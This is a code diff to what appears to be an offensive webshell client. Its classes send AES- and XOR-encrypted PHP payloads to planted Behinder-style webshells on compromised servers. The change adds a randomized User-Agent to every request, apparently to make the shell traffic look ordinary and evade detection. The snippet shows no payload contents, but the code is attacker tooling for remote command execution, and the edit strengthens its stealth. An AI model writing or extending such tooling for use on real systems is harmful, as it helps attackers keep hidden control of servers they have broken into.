@@ -15,10 +15,12 @@ from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad
 
 from . import exceptions
-from ..utils import random_english_words
+from ..utils import random_english_words, random_user_agent
 from .base import PHPSessionInterface, DirectoryEntry, BasicInfoEntry
 
 logger = logging.getLogger("sessions.php")
+
+user_agent = random_user_agent()
 
 SUBMIT_WRAPPER_PHP = """\
 if (session_status() == PHP_SESSION_NONE) {{
@@ -555,7 +557,7 @@ class PHPWebshellOneliner(PHPWebshell):
             data[self.password] = payload
             data.update(obfs_data)
         try:
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(headers={"User-Agent": user_agent}) as client:
                 response = await client.request(
                     method=self.method, url=self.url, params=params, data=data
                 )
@@ -581,7 +583,7 @@ class PHPWebshellBehinderAES(PHPWebshell):
     async def submit_raw(self, payload):
         data = behinder_aes(payload, self.key)
         try:
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(headers={"User-Agent": user_agent}) as client:
                 response = await client.request(method="POST", url=self.url, data=data)
                 return response.status_code, response.text
         except httpx.TimeoutException as exc:
@@ -604,7 +606,7 @@ class PHPWebshellBehinderXor(PHPWebshell):
     async def submit_raw(self, payload):
         data = behinder_xor(payload, self.key)
         try:
-            async with httpx.AsyncClient() as client:
+            async with httpx.AsyncClient(headers={"User-Agent": user_agent}) as client:
                 response = await client.request(method="POST", url=self.url, data=data)
                 return response.status_code, response.text
         except httpx.TimeoutException as exc:
